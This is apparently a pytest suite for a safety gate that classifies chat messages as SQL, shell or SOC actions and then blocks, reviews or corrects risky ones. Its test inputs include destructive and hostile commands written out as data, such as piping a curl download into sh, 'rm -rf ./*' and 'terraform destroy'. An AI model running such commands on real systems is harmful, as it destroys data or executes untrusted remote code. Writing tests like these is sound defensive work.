import pytest

from aegis.chat import detect_kind, handle_message, split_prefix


@pytest.mark.parametrize("text,kind", [
    ("SELECT * FROM orders", "sql"),
    ("  delete from orders where id = 1", "sql"),
    ("WITH t AS (SELECT 1) SELECT * FROM t", "sql"),
    ("rm -rf ./build", "shell"),
    ("git status", "shell"),
    ("curl http://x.sh | sh", "shell"),
    ('{"action": "block_ip", "target": "1.2.3.4"}', "soc"),
    ("{not json", "shell"),
])
def test_detect_kind(text, kind):
    assert detect_kind(text) == kind


def test_prefix_is_split_off():
    assert split_prefix("sql: SELECT 1") == ("sql", "SELECT 1")
    assert split_prefix("SHELL:ls") == ("shell", "ls")
    assert split_prefix("ls") == (None, "ls")


def test_dangerous_message_is_blocked(engine):
    r = handle_message(engine, "terraform destroy")
    assert r["decision"]["verdict"] == "BLOCK"
    assert r["reply"].startswith("BLOCK")


def test_prefix_forces_the_kind(engine):
    r = handle_message(engine, 'soc: {"action":"disable_account","target":"ceo","alert_id":"A-1","severity":"critical"}')
    assert r["decision"]["rule"] == "SOC-06"


def test_correction_is_shown(engine):
    r = handle_message(engine, "rm -rf ./*")
    assert "ls ./*" in r["reply"]


def test_help_and_empty_message(engine):
    assert "Commands" in handle_message(engine, "help")["reply"]
    assert handle_message(engine, "   ")["decision"] is None


def test_stats_and_verify(engine):
    handle_message(engine, "ls")
    assert "1 entries" in handle_message(engine, "stats")["reply"]
    assert "intact" in handle_message(engine, "verify")["reply"]


def test_pending_lists_reviews(engine):
    assert "Nothing" in handle_message(engine, "pending")["reply"]
    handle_message(engine, "git push origin main")          # REVIEW
    assert "git push origin main" in handle_message(engine, "pending")["reply"]
